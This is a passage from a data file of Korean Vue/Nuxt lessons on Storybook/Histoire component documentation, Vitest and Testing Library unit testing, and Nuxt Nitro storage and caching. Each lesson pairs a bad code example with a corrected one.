      id: 'vue-35', no: 35, name: `컴포넌트 문서화 (Storybook, Histoire)`,
      lead: `공용 컴포넌트가 생기면 "어떤 상태가 있고 어떻게 쓰는가" 를 코드로 적어 두는 습관입니다. 스토리는 상태의 열거이고, 시각 회귀와 상호작용 테스트의 재료이며, 디자이너와 같은 화면을 보는 자리입니다.`,
      lessons: [
        {
          id: 'l1', short: `언제`,
          title: `공용 UI 패키지가 생기는 순간 시작한다. 페이지는 스토리로 만들지 않는다`,
          why: `페이지는 라우터·스토어·API 에 얽혀 스토리로 격리하기 어렵고, E2E 가 맡는 영역입니다. 스토리의 대상은 재사용되는 버튼·입력·카드·모달·테이블입니다. 패키지로 나뉘기 전이라도 components/ui 가 열 개를 넘으면 도입합니다.`,
          bad: String.raw`
// stories/OrdersPage.stories.ts — useFetch, Pinia, 라우터 전부 모킹해서 페이지를 스토리로 → 유지비만 크다
`,
          good: String.raw`
// 대상: packages/ui/src/** 또는 components/ui/**
// 각 컴포넌트 옆에 스토리: Button.vue + Button.stories.ts (또는 Button.story.vue)
// 페이지·레이아웃·기능 컴포넌트(OrderList) 는 제외 — 21회차 E2E 로
`,
        },
        {
          id: 'l2', short: `선택`,
          title: `Vue 전용·가벼움은 Histoire, 생태계·디자이너 협업은 Storybook`,
          why: `Histoire 는 Vite 네이티브라 설정이 거의 없고 story.vue 로 템플릿 그대로 씁니다. Storybook 은 애드온(a11y, 인터랙션, Figma), 포터블 스토리(vitest 재사용), Chromatic 연동이 강합니다. 작은 팀·Vue 만이면 Histoire, 디자인 시스템 규모면 Storybook.`,
          bad: String.raw`
# 두 가지를 다 설치해 두고 스토리 일부는 .stories.ts, 일부는 .story.vue
`,
          good: String.raw`
# Histoire
pnpm add -D histoire @histoire/plugin-vue      # histoire.config.ts 는 거의 비어도 된다
# Button.story.vue
<script setup lang="ts">
import { ref } from 'vue'
import Button from './Button.vue'
const variant = ref<'primary' | 'ghost'>('primary')
</script>
<template>
  <Story title="ui/Button">
    <Variant title="primary"><Button variant="primary">저장</Button></Variant>
    <Variant title="disabled"><Button disabled>저장</Button></Variant>
    <Variant title="playground">
      <template #controls><HstSelect v-model="variant" :options="['primary', 'ghost']" title="variant" /></template>
      <Button :variant="variant">저장</Button>
    </Variant>
  </Story>
</template>

# Storybook
pnpm dlx storybook@latest init          # @storybook/vue3-vite 프레임워크 선택
`,
        },
        {
          id: 'l3', short: `상태 열거`,
          title: `스토리는 "예쁜 기본값" 하나가 아니라 상태의 전수 목록이다`,
          why: `기본 상태 하나만 있는 스토리는 장식입니다. 로딩·오류·빈·긴 텍스트·비활성·포커스·RTL 까지 열거해야 디자이너가 빠뜨린 상태를 찾고, 시각 회귀가 그 상태들을 지킵니다. 상태 목록 자체가 컴포넌트 스펙입니다.`,
          bad: String.raw`
export const Default = { args: { label: '저장' } }      // 끝
`,
          good: String.raw`
// Button.stories.ts
import type { Meta, StoryObj } from '@storybook/vue3'
import Button from './Button.vue'
const meta: Meta<typeof Button> = { component: Button, title: 'ui/Button', args: { default: '저장' } }
export default meta
type S = StoryObj<typeof Button>

export const Primary: S = {}
export const Ghost: S = { args: { variant: 'ghost' } }
export const Loading: S = { args: { loading: true } }
export const Disabled: S = { args: { disabled: true } }
export const WithIcon: S = { args: { icon: 'save' } }
export const LongLabel: S = { args: { default: '정말로 아주 긴 버튼 라벨이 들어왔을 때 줄바꿈과 말줄임 처리' } }
export const Focused: S = { parameters: { pseudo: { focusVisible: true } } }
export const Small: S = { args: { size: 'sm' } }
// 데이터 컴포넌트(Table) 라면: Empty, Error, OneRow, ThousandRows, ColumnOverflow
`,
        },
        {
          id: 'l4', short: `컨트롤`,
          title: `props 는 타입에서 컨트롤을 자동 생성하게 두고, 수동 argTypes 는 예외만`,
          why: `argTypes 를 손으로 적으면 props 가 바뀔 때 스토리가 거짓말을 합니다. defineProps 에 타입을 제대로 적으면 Storybook 의 vue-component-meta 가 컨트롤과 설명을 뽑아냅니다. JSDoc 주석이 그대로 문서가 됩니다.`,
          bad: String.raw`
argTypes: { variant: { control: 'select', options: ['primary', 'ghost'] }, size: { control: 'select', options: ['sm', 'md'] } }   // 'lg' 추가되면 누락
`,
          good: String.raw`
<!-- Button.vue: 타입 + JSDoc 이 곧 문서 -->
<script setup lang="ts">
withDefaults(defineProps<{
  /** 시각적 강조 수준 */
  variant?: 'primary' | 'ghost' | 'danger'
  /** 높이와 패딩 */
  size?: 'sm' | 'md' | 'lg'
  /** 진행 중 표시. 클릭 불가 */
  loading?: boolean
}>(), { variant: 'primary', size: 'md' })
</script>

// .storybook/main.ts — 타입에서 컨트롤·설명 추출
export default { framework: '@storybook/vue3-vite', docs: { autodocs: 'tag' },
  async viteFinal(c) { return c },
  // vue-component-meta 를 docgen 으로
  // framework: { name: '@storybook/vue3-vite', options: { docgen: 'vue-component-meta' } }
}
`,
        },
        {
          id: 'l5', short: `조합표`,
          title: `size × variant × state 를 한 화면에 깔아 두는 매트릭스 스토리를 만든다`,
          why: `변형 하나씩 클릭해 보면 "ghost 의 sm 에서만 패딩이 이상한" 조합을 놓칩니다. 모든 조합을 격자로 그린 스토리 하나는 디자이너 검수와 시각 회귀 스냅샷에 가장 효율이 좋습니다(32회차 variants 선언과 짝).`,
          bad: String.raw`
// 조합을 사람이 하나씩 컨트롤 바꿔 가며 확인
`,
          good: String.raw`
export const Matrix: S = {
  render: () => ({
    components: { Button },
    setup: () => ({ variants: ['primary', 'ghost', 'danger'], sizes: ['sm', 'md', 'lg'], states: [{}, { disabled: true }, { loading: true }] }),
    template: /* html */ \`
      <table><tr><th></th><th v-for="s in sizes" :key="s">{{ s }}</th></tr>
        <template v-for="v in variants" :key="v"><tr v-for="(st, i) in states" :key="i">
          <th>{{ v }} {{ Object.keys(st)[0] ?? '' }}</th>
          <td v-for="s in sizes" :key="s"><Button :variant="v" :size="s" v-bind="st">저장</Button></td>
        </tr></template>
      </table>\`,
  }),
  parameters: { controls: { disable: true } },
}
`,
        },
        {
          id: 'l6', short: `전역 의존`,
          title: `Pinia·라우터·i18n 은 데코레이터로 한 번 넣고, 컴포넌트는 전역에 덜 기대게 만든다`,
          why: `스토리에서 "useRoute is undefined" 가 나면 두 가지 신호입니다. 하나는 전역 설정이 빠진 것이고, 다른 하나는 공용 컴포넌트가 라우터에 직접 의존한다는 것입니다. 전자는 preview.ts 데코레이터로, 후자는 props/slots 로 돌려 해결합니다(29회차 l3).`,
          bad: String.raw`
// 스토리마다 setup(() => { setActivePinia(createPinia()); app.use(router); app.use(i18n) })
`,
          good: String.raw`
// .storybook/preview.ts
import { setup } from '@storybook/vue3'
import { createPinia } from 'pinia'
import { createRouter, createMemoryHistory } from 'vue-router'
import { i18n } from '../src/i18n'
setup((app) => {
  app.use(createPinia())
  app.use(createRouter({ history: createMemoryHistory(), routes: [{ path: '/', component: { template: '<div/>' } }] }))
  app.use(i18n)
})
export const decorators = [(story) => ({ components: { story }, template: '<div class="p-4 bg-surface text-fg"><story /></div>' })]
// 테마 토글: globalTypes.theme + 데코레이터에서 document.documentElement.dataset.theme = context.globals.theme

// 그리고 공용 컴포넌트는 <NuxtLink :to> 대신 :href + @click 또는 'to' prop 을 받아 라우터 없이도 그려지게
`,
        },
        {
          id: 'l7', short: `한 벌`,
          title: `스토리에 play 를 붙여 상호작용을 검증하고, vitest 에서 같은 스토리를 다시 쓴다`,
          why: `스토리와 단위 테스트가 같은 컴포넌트를 따로 마운트하면 두 벌을 유지합니다. Storybook 의 play 함수는 브라우저에서 돌고, portable stories 로 vitest 에서도 그대로 실행됩니다. 스토리 한 벌이 문서·시각 회귀·상호작용 테스트를 다 맡습니다.`,
          bad: String.raw`
// Button.stories.ts 와 Button.test.ts 가 각자 mount(Button, { props }) — 변형이 바뀌면 두 군데 수정
`,
          good: String.raw`
// Modal.stories.ts
import { expect, userEvent, within } from '@storybook/test'
export const OpensAndTrapsFocus: S = {
  args: { open: true, title: '삭제할까요?' },
  play: async ({ canvasElement }) => {
    const c = within(canvasElement)
    await expect(c.getByRole('dialog', { name: '삭제할까요?' })).toBeVisible()
    await userEvent.tab()
    await expect(c.getByRole('button', { name: '취소' })).toHaveFocus()
    await userEvent.keyboard('{Escape}')
    await expect(c.queryByRole('dialog')).not.toBeInTheDocument()
  },
}

// vitest.config.ts — 스토리를 테스트로 (@storybook/addon-vitest, 브라우저 모드)
import { storybookTest } from '@storybook/addon-vitest/vitest-plugin'
export default defineConfig({ plugins: [storybookTest()], test: { browser: { enabled: true, provider: 'playwright', instances: [{ browser: 'chromium' }] } } })
// → 모든 스토리가 "렌더되는가" 스모크 + play 가 있는 것은 상호작용 테스트
`,
        },
        {
          id: 'l8', short: `사용 가이드`,
          title: `문서 페이지에는 "언제 쓰고 언제 쓰지 않는지" 와 접근성 노트를 적는다`,
          why: `props 표는 자동 생성됩니다. 사람이 적어야 하는 건 판단입니다. "확인 모달 대신 인라인 되돌리기를 쓸 것", "아이콘만 있는 버튼은 aria-label 필수" 같은 한 줄이 잘못된 사용을 막습니다. autodocs 위에 MDX 한 장을 얹습니다.`,
          bad: String.raw`
// 자동 생성 props 표만 있는 문서. 팀원이 Modal 을 토스트 용도로 쓴다
`,
          good: String.raw`
{/* Modal.mdx */}
import { Meta, Canvas, Controls } from '@storybook/blocks'
import * as Stories from './Modal.stories'

<Meta of={Stories} />
# Modal
사용자의 결정을 받아야 할 때만 씁니다. 결과 알림은 Toast, 되돌릴 수 있는 삭제는 인라인 Undo 를 쓰세요.

## 접근성
- 열리면 첫 포커스는 가장 안전한 버튼(취소) 에, Esc 로 닫힙니다. 포커스는 열기 전 요소로 돌아갑니다 (22회차).
- title 은 필수이며 aria-labelledby 로 연결됩니다.

<Canvas of={Stories.Default} />
<Controls />

## 하지 말 것
- 모달 위에 모달을 열지 않습니다. 단계가 필요하면 안에서 전환합니다.
`,
        },
        {
          id: 'l9', short: `시각 회귀`,
          title: `스토리를 스크린샷으로 굳혀 두고 PR 마다 비교한다. 범위는 공용 컴포넌트만`,
          why: `CSS 한 줄이 어디를 깨뜨렸는지 사람 눈으로는 못 봅니다. 스토리마다 스크린샷을 기준선으로 두면 변화가 diff 로 보입니다. Chromatic 이 가장 쉽고, 직접 하려면 Storybook test-runner 나 Playwright 로 스토리 URL 을 찍습니다(21회차 시각 회귀 범위).`,
          bad: String.raw`
// 페이지 전체 스크린샷 비교 → 데이터·날짜·광고가 바뀔 때마다 실패. 결국 무시
`,
          good: String.raw`
# Chromatic (Storybook)
pnpm add -D chromatic
npx chromatic --project-token=$CHROMATIC_TOKEN --only-changed      # 바뀐 스토리만, PR 에 리뷰 링크

# 직접: Storybook 을 정적 빌드한 뒤 Playwright 로 스토리 iframe 찍기
// e2e/visual.spec.ts
for (const id of storyIds) test(id, async ({ page }) => {
  await page.goto('http://localhost:6006/iframe.html?id=' + id + '&viewMode=story')
  await page.locator('#storybook-root').waitFor()
  await expect(page).toHaveScreenshot(id + '.png', { animations: 'disabled', maxDiffPixelRatio: 0.001 })
})
// 기준선은 리눅스 CI 에서만 생성 (OS 마다 폰트 렌더링이 달라 로컬 기준선은 쓰지 않는다)
`,
        },
        {
          id: 'l10', short: `운영`,
          title: `스토리 없는 공용 컴포넌트는 머지되지 않게 하고, 빌드를 배포해 링크로 공유한다`,
          why: `문서는 강제하지 않으면 썩습니다. ui/ 에 컴포넌트가 추가될 때 스토리 파일이 없으면 CI 가 실패하게 두면 됩니다. 정적 빌드를 Pages 나 Chromatic 에 올려 디자이너·기획이 링크로 보게 하면 "최신 버전이 뭐예요" 가 사라집니다.`,
          bad: String.raw`
// 스토리북은 개발자 로컬에서만. 디자이너는 스크린샷을 슬랙으로 요청
`,
          good: String.raw`
// scripts/check-stories.ts (CI)
import { globSync } from 'node:fs'
const comps = globSync('packages/ui/src/**/*.vue').filter(f => !f.includes('/internal/'))
const missing = comps.filter(f => !existsSync(f.replace(/\.vue$/, '.stories.ts')) && !existsSync(f.replace(/\.vue$/, '.story.vue')))
if (missing.length) { console.error('스토리 없음:', missing); process.exit(1) }

# 배포: main 머지 시 정적 빌드 → GitHub Pages (또는 Chromatic 의 호스팅)
- run: pnpm --filter @company/ui build-storybook -o dist-storybook
- uses: actions/upload-pages-artifact@v3  with: { path: packages/ui/dist-storybook }
# 토큰 문서도 스토리로: Colors.mdx 에서 tokens.ts 를 읽어 스와치 표 렌더 (32회차)
`,
        },
      ],
    },
    {
      id: 'vue-36', no: 36, name: `단위 테스트 심화 (Vitest, Testing Library)`,
      lead: `무엇을 단위로 테스트하고 무엇을 하지 않을지, 컴포저블·스토어·비동기·Nuxt 전용 API 를 어떻게 다룰지의 습관입니다. 구현이 아니라 동작을 검사하고, 느린 테스트를 만들지 않습니다.`,
      lessons: [
        {
          id: 'l1', short: `대상`,
          title: `분기가 있는 컴포저블·유틸·복잡한 컴포넌트만 단위로. 통과만 하는 컴포넌트는 안 쓴다`,
          why: `props 를 받아 그대로 그리는 컴포넌트의 테스트는 템플릿을 두 번 적는 것입니다. 가치는 조건이 있는 곳에 있습니다. 가격 계산, 권한 분기, 폼 검증, 재시도 로직, 날짜 포맷. 그 외는 스토리(35회차) 와 E2E(21회차) 가 더 싸게 덮습니다.`,
          bad: String.raw`
it('renders title', () => {
  const w = mount(Card, { props: { title: 'A' } })
  expect(w.text()).toContain('A')              // 템플릿 재진술
})
`,
          good: String.raw`
// 분기가 있는 것
it('회원 등급별 할인: VIP 는 10%, 쿠폰과 중복 불가', () => {
  expect(calcDiscount({ grade: 'vip', coupon: null, total: 10000 })).toBe(1000)
  expect(calcDiscount({ grade: 'vip', coupon: { amount: 500 }, total: 10000 })).toBe(1000)
})
it('재고 0 이면 담기 버튼이 비활성', async () => {
  render(ProductCard, { props: { product: { stock: 0 } } })
  expect(screen.getByRole('button', { name: '담기' })).toBeDisabled()
})
`,
        },
        {
          id: 'l2', short: `동작`,
          title: `Testing Library 로 사용자가 보는 것(역할·텍스트) 을 검사하고 wrapper.vm 을 만지지 않는다`,
          why: `wrapper.vm.count 나 wrapper.find('.btn-primary') 는 내부 이름과 클래스에 묶여 리팩터링마다 깨집니다. getByRole('button', { name }) 은 접근성 트리를 보므로 구현이 바뀌어도 살아남고, 접근성 결함도 드러냅니다(21회차 셀렉터와 같은 원칙).`,
          bad: String.raw`
const w = mount(Counter)
await w.find('.btn-plus').trigger('click')
expect(w.vm.count).toBe(1)                   // 내부 상태
expect(w.find('.count').text()).toBe('1')     // 클래스
`,
          good: String.raw`
import { render, screen } from '@testing-library/vue'
import userEvent from '@testing-library/user-event'

it('더하기를 누르면 1 이 된다', async () => {
  render(Counter)
  await userEvent.click(screen.getByRole('button', { name: '더하기' }))
  expect(screen.getByText('1')).toBeInTheDocument()
})
// emit 검사가 필요할 때만 @vue/test-utils 의 wrapper.emitted() — 그것도 "사용자 행동 → 이벤트" 로
`,
        },
        {
          id: 'l3', short: `컴포저블`,
          title: `컴포저블은 effectScope 안에서 직접 호출해 테스트하고, 라이프사이클이 필요하면 헬퍼 컴포넌트에 마운트한다`,
          why: `컴포저블을 테스트하려고 더미 컴포넌트를 매번 만들면 장황합니다. 반응형만 쓰는 컴포저블은 effectScope().run() 으로 충분하고, onMounted·inject 를 쓰는 것만 withSetup 헬퍼로 마운트합니다. 두 헬퍼를 test/utils 에 둡니다.`,
          bad: String.raw`
const C = defineComponent({ setup() { return useCounter() }, template: '<div/>' })
const w = mount(C); w.vm.inc(); expect(w.vm.count).toBe(1)     // 매 테스트마다 더미 컴포넌트
`,
          good: String.raw`
// test/utils.ts
export function withSetup<T>(composable: () => T, provide: Record<string | symbol, unknown> = {}) {
  let result!: T
  const app = createApp({ setup() { result = composable(); return () => null } })
  for (const [k, v] of Object.entries(provide)) app.provide(k, v)
  app.mount(document.createElement('div'))
  return { result, app }
}

// 반응형만
it('useCounter', () => {
  const scope = effectScope()
  const { count, inc } = scope.run(() => useCounter())!
  inc(); expect(count.value).toBe(1)
  scope.stop()
})
// 라이프사이클·inject
it('useTheme 는 provide 된 기본값을 쓴다', () => {
  const { result, app } = withSetup(() => useTheme(), { theme: 'dark' })
  expect(result.theme.value).toBe('dark'); app.unmount()
})
`,
        },
        {
          id: 'l4', short: `Pinia`,
          title: `createTestingPinia 로 스토어를 넣고, 액션은 stub 한 채 호출 여부만 본다`,
          why: `컴포넌트 테스트에서 실제 스토어 액션이 돌면 fetch 까지 따라옵니다. 테스트용 Pinia 는 액션을 자동으로 vi.fn 으로 바꾸고 initialState 로 원하는 상태를 바로 만듭니다. 스토어 자체의 로직은 스토어 테스트에서 실제 Pinia 로 따로 봅니다.`,
          bad: String.raw`
render(Cart)                       // 진짜 스토어 → 진짜 fetch → 네트워크 오류
`,
          good: String.raw`
import { createTestingPinia } from '@pinia/testing'

it('비어 있으면 결제 버튼이 없다', () => {
  render(Cart, { global: { plugins: [createTestingPinia({ initialState: { cart: { items: [] } } })] } })
  expect(screen.queryByRole('button', { name: '결제' })).not.toBeInTheDocument()
})
it('결제를 누르면 checkout 액션을 부른다', async () => {
  render(Cart, { global: { plugins: [createTestingPinia({ initialState: { cart: { items: [{ id: 'a', qty: 1 }] } }, stubActions: true })] } })
  const cart = useCartStore()
  await userEvent.click(screen.getByRole('button', { name: '결제' }))
  expect(cart.checkout).toHaveBeenCalledOnce()
})
// 스토어 로직: setActivePinia(createPinia()) 로 실제 스토어, $fetch 만 모킹 (l6)
`,
        },
        {
          id: 'l5', short: `비동기`,
          title: `findBy* 와 flushPromises 로 기다리고, 디바운스는 가짜 타이머로 당긴다. 실제 시간을 기다리지 않는다`,
          why: `await new Promise(r => setTimeout(r, 500)) 은 테스트를 느리게 하고 CI 에서 플래키해집니다. DOM 변화는 findByText 가 폴링하고, Promise 체인은 flushPromises 가 비우며, 시간 의존 로직은 vi.useFakeTimers 로 즉시 진행합니다.`,
          bad: String.raw`
await userEvent.type(input, 'abc')
await new Promise(r => setTimeout(r, 600))      // 디바운스 500ms 기다림
expect(search).toHaveBeenCalled()
`,
          good: String.raw`
// DOM 이 바뀔 때까지
await userEvent.click(screen.getByRole('button', { name: '불러오기' }))
expect(await screen.findByText('주문 3건')).toBeInTheDocument()     // 기본 1초 폴링

// 디바운스
beforeEach(() => vi.useFakeTimers({ shouldAdvanceTime: true }))
afterEach(() => vi.useRealTimers())
it('입력 500ms 뒤 한 번만 검색', async () => {
  const user = userEvent.setup({ advanceTimers: vi.advanceTimersByTime })
  render(Search, { props: { onSearch } })
  await user.type(screen.getByRole('searchbox'), 'abc')
  expect(onSearch).not.toHaveBeenCalled()
  vi.advanceTimersByTime(500)
  expect(onSearch).toHaveBeenCalledWith('abc')
})
`,
        },
        {
          id: 'l6', short: `모킹 범위`,
          title: `모듈 모킹은 최소로. 네트워크는 MSW 로 경계에서 막는다`,
          why: `vi.mock 으로 내부 모듈을 갈아 끼우면 테스트가 구현 구조에 묶입니다. 바깥 경계(HTTP) 에서 막으면 내부를 어떻게 리팩터링해도 테스트가 그대로입니다. MSW 핸들러는 E2E(21회차) 와도 공유할 수 있습니다.`,
          bad: String.raw`
vi.mock('~/composables/useOrders', () => ({ useOrders: () => ({ orders: ref([...]) }) }))   // 내부 모듈 교체
vi.mock('~/utils/format')                                                                    // 왜?
`,
          good: String.raw`
// test/msw.ts
import { setupServer } from 'msw/node'
import { http, HttpResponse } from 'msw'
export const server = setupServer(
  http.get('/api/orders', () => HttpResponse.json([{ id: 'o1', total: 1000 }])),
)
// vitest.setup.ts
beforeAll(() => server.listen({ onUnhandledRequest: 'error' }))   // 안 막은 요청은 실패
afterEach(() => server.resetHandlers())
afterAll(() => server.close())

// 테스트에서 케이스별 덮어쓰기
server.use(http.get('/api/orders', () => HttpResponse.json({ message: 'boom' }, { status: 500 })))
render(Orders)
expect(await screen.findByRole('alert')).toHaveTextContent('불러오지 못했습니다')
`,
        },
        {
          id: 'l7', short: `Nuxt`,
          title: `Nuxt 전용 API 는 @nuxt/test-utils 의 mountSuspended, mockNuxtImport, registerEndpoint 로 다룬다`,
          why: `useFetch, useRoute, useRuntimeConfig 는 Nuxt 런타임이 있어야 동작합니다. 일반 vitest 환경에서 mount 하면 전부 undefined 입니다. nuxt 환경(environment: 'nuxt') 에서 mountSuspended 로 마운트하고, 자동 import 는 mockNuxtImport 로, 서버 라우트는 registerEndpoint 로 대체합니다.`,
          bad: String.raw`
mount(OrdersPage)        // useFetch is not defined / inject() can only be used inside setup
`,
          good: String.raw`
// vitest.config.ts
import { defineVitestConfig } from '@nuxt/test-utils/config'
export default defineVitestConfig({ test: { environment: 'nuxt' } })   // 또는 파일 상단 // @vitest-environment nuxt

// orders.test.ts
import { mountSuspended, mockNuxtImport, registerEndpoint } from '@nuxt/test-utils/runtime'
registerEndpoint('/api/orders', () => [{ id: 'o1', total: 1000 }])
mockNuxtImport('useRoute', () => () => ({ query: { page: '2' } }))

it('2페이지 주문을 그린다', async () => {
  const w = await mountSuspended(OrdersPage)           // useFetch 가 끝날 때까지 기다린다
  expect(w.text()).toContain('1,000원')
})
// 컴포넌트가 Nuxt 에 안 기대면(순수 Vue) 일반 환경이 훨씬 빠르다 — 파일 단위로 환경을 고른다
`,
        },
        {
          id: 'l8', short: `스냅샷`,
          title: `큰 DOM 스냅샷은 금지. 인라인 스냅샷은 작은 값에만 쓴다`,
          why: `200줄 HTML 스냅샷은 아무도 읽지 않고 -u 로 갱신만 합니다. 그건 테스트가 아니라 "변했다" 알림입니다. 포맷 함수 결과, 변환된 객체처럼 한눈에 들어오는 값만 toMatchInlineSnapshot 으로 코드 옆에 둡니다.`,
          bad: String.raw`
expect(wrapper.html()).toMatchSnapshot()        // __snapshots__/Orders.test.ts.snap 300줄
`,
          good: String.raw`
expect(formatMoney(1234567)).toMatchInlineSnapshot(\`"1,234,567원"\`)
expect(toQuery({ page: 2, sort: ['-createdAt'], q: '' })).toMatchInlineSnapshot(\`
  {
    "page": "2",
    "sort": "-createdAt",
  }
\`)
// DOM 은 역할·텍스트로 단언 (l2). 레이아웃은 시각 회귀 (35회차)
`,
        },
        {
          id: 'l9', short: `구조`,
          title: `테스트 하나에 행동 하나. 이름은 문장, 반복은 test.each`,
          why: `한 테스트에 열 가지를 단언하면 첫 실패에서 멈춰 나머지를 모릅니다. 이름이 'works' 면 실패 로그가 아무것도 말해 주지 않습니다. 경계값 묶음은 test.each 표로 적으면 케이스 추가가 한 줄입니다.`,
          bad: String.raw`
it('works', () => {
  expect(parse('1')).toBe(1); expect(parse('')).toBe(0); expect(parse('x')).toBeNaN(); expect(parse('1,000')).toBe(1000) ...
})
`,
          good: String.raw`
describe('parseAmount', () => {
  test.each([
    ['1', 1], ['1,000', 1000], ['', 0], [' 12 ', 12], ['-5', 0],
  ])('%s → %s', (input, expected) => { expect(parseAmount(input)).toBe(expected) })
  it('숫자가 아니면 오류를 던진다', () => { expect(() => parseAmount('x')).toThrow('금액') })
})
// describe 는 대상 하나, 중첩은 두 단계까지. beforeEach 에 공유 상태를 쌓지 말고 팩토리 함수로 매번 새로 만든다
`,
        },
        {
          id: 'l10', short: `속도`,
          title: `커버리지 숫자를 목표로 삼지 않는다. 바뀐 파일만 돌리고 느린 테스트를 추적한다`,
          why: `"80% 이상" 목표는 템플릿 재진술 테스트(l1) 를 양산합니다. 커버리지는 "분기가 있는데 테스트가 없는 곳" 을 찾는 도구로만 씁니다. 속도는 격리 수준과 환경 선택이 결정합니다. 20초 넘는 스위트는 개발자가 안 돌리게 됩니다.`,
          bad: String.raw`
# CI: coverage 80% 미만이면 실패 → 의미 없는 테스트로 숫자 채우기
# 로컬: 전체 스위트 2분 → 아무도 안 돌림
`,
          good: String.raw`
// vitest.config.ts
test: {
  coverage: { provider: 'v8', include: ['src/**'], exclude: ['**/*.stories.*', '**/*.d.ts'], thresholds: { perFile: false } },  // 보고만
  isolate: false,                       // 파일 간 격리 끄면 2~3배 빠름 (전역을 더럽히는 테스트가 없을 때)
  pool: 'threads',
  slowTestThreshold: 300,               // 300ms 넘는 테스트는 리포트에 표시
}
# 로컬: 바뀐 것만
vitest --changed origin/main
# CI: 변경 파일 커버리지만 PR 코멘트 (vitest-coverage-report-action 등), 전역 임계치 없음
# 리뷰 체크(39회차): "분기 추가했는데 테스트 없음" 은 커버리지 diff 가 알려 준다
`,
        },
      ],
    },
    {
      id: 'vue-37', no: 37, name: `Nuxt 서버 심화 (Nitro 스토리지, 태스크, 캐시)`,
      lead: `server/ 디렉터리가 커질 때의 습관입니다. 스토리지는 드라이버로 바꾸고, 캐시는 키와 수명을 설계하고, 정기 작업은 태스크로 두고, 핸들러는 얇게 유지합니다. 어느 프리셋(Node, 엣지) 으로 배포해도 같은 코드가 돌게 합니다.`,
      lessons: [
        {
          id: 'l1', short: `스토리지`,
          title: `파일·캐시·세션은 useStorage 로 접근하고, 드라이버는 환경이 정한다`,
          why: `fs.writeFile('/tmp/...') 은 서버리스·엣지에서 없거나 매 요청 사라집니다. Nitro 스토리지는 같은 코드로 개발은 파일, 운영은 Redis·S3 를 씁니다. 마운트 이름이 경계이고, 핸들러는 어디 저장되는지 모릅니다.`,
          bad: String.raw`
import { writeFile, readFile } from 'node:fs/promises'
await writeFile('./data/session-' + id + '.json', JSON.stringify(s))     // 컨테이너 재시작 → 사라짐, 엣지 → 오류
`,
          good: String.raw`
// nuxt.config.ts
nitro: {
  storage:    { sessions: { driver: 'redis', url: process.env.REDIS_URL }, uploads: { driver: 's3', bucket: 'app-uploads' } },
  devStorage: { sessions: { driver: 'fs', base: './.data/sessions' },     uploads: { driver: 'fs', base: './.data/uploads' } },
}
// server/utils/session.ts — 마운트 이름만 안다
export const sessions = () => useStorage<Session>('sessions')
await sessions().setItem(id, session, { ttl: 60 * 60 * 24 })
const s = await sessions().getItem(id)
// 기본 제공 마운트: useStorage('cache') (defineCachedHandler 가 쓰는 곳), useStorage('assets:server') (server/assets 읽기 전용)
`,
        },
        {
          id: 'l2', short: `캐시 핸들러`,
          title: `공용 데이터는 defineCachedEventHandler, 함수 단위는 defineCachedFunction. 사용자별 데이터는 키에 사용자를 넣거나 캐시하지 않는다`,
          why: `상품 목록을 매 요청 DB 에서 읽을 이유가 없습니다. 캐시 핸들러는 결과를 스토리지에 두고 maxAge 동안 재사용하며 staleMaxAge 로 "낡은 것 주고 뒤에서 갱신" 도 됩니다. 반대로 /api/me 를 캐시하면 남의 데이터가 보입니다. 키 설계가 전부입니다.`,
          bad: String.raw`
export default defineCachedEventHandler(async (e) => {
  const user = await requireUser(e)
  return db.orders.findMany({ where: { userId: user.id } })     // 첫 사용자의 주문이 모두에게
}, { maxAge: 60 })
`,
          good: String.raw`
// 공용: 키는 경로+쿼리 기본값으로 충분
export default defineCachedEventHandler(async (e) => db.products.findMany({ where: { live: true } }),
  { maxAge: 60, staleMaxAge: 600, swr: true, name: 'products', getKey: (e) => getQuery(e).category?.toString() ?? 'all' })

// 사용자별이지만 비싼 것: 키에 사용자 id
export default defineCachedEventHandler(async (e) => buildDashboard(e.context.user.id),
  { maxAge: 30, getKey: (e) => 'dash:' + e.context.user.id, varies: [] })

// 함수 단위
const getRates = defineCachedFunction(async (base: string) => $fetch('https://api.rates/' + base),
  { maxAge: 3600, name: 'rates', getKey: (base) => base })
// 주의: 캐시 핸들러는 응답 헤더(Set-Cookie) 를 같이 굳힌다 → 인증·쿠키를 건드리는 핸들러는 캐시 금지
`,
        },
        {
          id: 'l3', short: `routeRules`,
          title: `페이지 캐시는 routeRules 로: prerender, isr, swr, cache 의 차이를 알고 고른다`,
          why: `네 가지는 "언제 누가 다시 만드는가" 가 다릅니다. prerender 는 빌드 때 한 번, swr 은 Nitro 가 수명 뒤 백그라운드 재생성, isr 은 CDN(Vercel/Netlify) 레벨의 같은 동작, cache 는 세부 옵션 직접 지정입니다. 플랫폼이 isr 을 지원하지 않으면 swr 로 떨어집니다.`,
          bad: String.raw`
routeRules: { '/**': { swr: 3600 } }         // 로그인 페이지·마이페이지까지 1시간 캐시
`,
          good: String.raw`
routeRules: {
  '/':            { prerender: true },                 // 빌드 때 생성, CDN 에서 서빙
  '/about':       { prerender: true },
  '/blog/**':     { isr: 3600 },                        // 플랫폼 ISR (없으면 swr 로 동작)
  '/products/**': { swr: 300 },                         // 5분 지나면 낡은 것 주고 뒤에서 재생성
  '/search':      { cache: { maxAge: 60, varies: ['accept-language'] } },
  '/me/**':       { ssr: true, cache: false, headers: { 'cache-control': 'private, no-store' } },
  '/admin/**':    { ssr: false },                       // SPA
  '/api/public/**': { cors: true, headers: { 'cache-control': 'public, max-age=60' } },
}
// 검사: 캐시되는 라우트는 쿠키·사용자별 분기가 없는지 (23회차 l9 와 같은 원칙)
`,
        },
        {
          id: 'l4', short: `무효화`,
          title: `캐시 키에 이름 접두사를 두고, 데이터가 바뀌면 그 키를 지운다. 수명만 믿지 않는다`,
          why: `상품을 수정했는데 5분 동안 옛 값이 보이면 운영팀이 "저장 안 됐다" 고 합니다. 캐시 항목은 cache:<name>:<key> 로 저장되므로 쓰기 핸들러에서 같은 키를 지우면 즉시 반영됩니다. name 을 명시하지 않으면 키가 함수 해시라 못 지웁니다.`,
          bad: String.raw`
// 수정 API 는 DB 만 바꾸고 끝. "5분 기다리세요"
`,
          good: String.raw`
// server/utils/cache.ts
export async function invalidate(name: string, key?: string) {
  const cache = useStorage('cache')
  if (key) return cache.removeItem('nitro:handlers:' + name + ':' + key + '.json')
  const keys = await cache.getKeys('nitro:handlers:' + name)
  await Promise.all(keys.map(k => cache.removeItem(k)))
}
// defineCachedFunction 은 'nitro:functions:' + name, 키 형식은 Nitro 버전마다 다를 수 있으니 getKeys 로 확인 후 접두사 상수로

// server/api/products/[id].put.ts
await db.products.update(...)
await invalidate('products')                       // 목록 전체
await invalidate('product', id)                    // 상세 하나
